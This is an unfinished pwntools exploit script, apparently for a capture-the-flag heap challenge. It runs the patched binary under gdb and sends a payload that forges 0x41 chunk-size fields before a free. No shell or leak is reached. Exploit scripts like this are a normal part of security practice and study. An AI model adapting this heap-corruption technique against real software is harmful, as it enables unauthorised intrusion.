#!/usr/bin/env python3

from pwn import *

exe = ELF("./task_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = 'kitty'

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = gdb.debug('./task_patched')

    r.sendlineafter('>', b'1')
    r.sendafter('Data: ', b'test')
    r.sendlineafter('>', b'1')
    r.sendafter('Data: ', b'A' * 8 + p64(65) + b'A' * 8 + p64(65))
    r.sendlineafter('>', b'2')
    r.sendlineafter('Index: ', b'0')

    r.interactive()


if __name__ == "__main__":
    main()
